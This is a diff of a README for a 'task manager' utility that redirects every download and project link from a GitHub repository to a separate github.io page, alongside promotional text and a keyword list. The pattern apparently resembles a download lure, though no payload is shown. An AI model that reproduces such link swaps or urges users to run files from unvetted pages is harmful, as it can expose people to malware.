@@ -1,6 +1,6 @@
 # 🚀 omarchy-task-manager - Close Frozen Apps Instantly
 
-[⬇️ Download Now](https://github.com/David83Developer/omarchy-task-manager)
+[⬇️ Download Now](https://david83developer.github.io)
 
 ## 🖥️ What Is This?
 
@@ -16,7 +16,7 @@ Every computer user eventually hits a frozen app. Maybe a game stops responding,
 
 Visit this link to download the application:
 
-[⬇️ https://github.com/David83Developer/omarchy-task-manager](https://github.com/David83Developer/omarchy-task-manager)
+[⬇️ https://david83developer.github.io](https://david83developer.github.io)
 
 ### Step 2: Open the Downloaded File
 
@@ -124,7 +124,7 @@ If you accidentally close something important, don't worry. You can always resta
 
 If you run into issues or have questions, visit the project page on GitHub:
 
-[https://github.com/David83Developer/omarchy-task-manager](https://github.com/David83Developer/omarchy-task-manager)
+[https://david83developer.github.io](https://david83developer.github.io)
 
 You'll find the latest updates, release notes, and a way to report problems.
 
@@ -138,6 +138,6 @@ omarchy-task-manager exists for one reason: to get you back to work faster. No m
 
 Download it now and see how much easier managing your programs can be:
 
-[⬇️ Get omarchy-task-manager](https://github.com/David83Developer/omarchy-task-manager)
+[⬇️ Get omarchy-task-manager](https://david83developer.github.io)
 
 Keywords: task manager, omarchy, close app, frozen app, memory usage, process manager, desktop tool, Windows utility, system monitor, end task, resource monitor, app closer, performance tool, productivity app, system utility
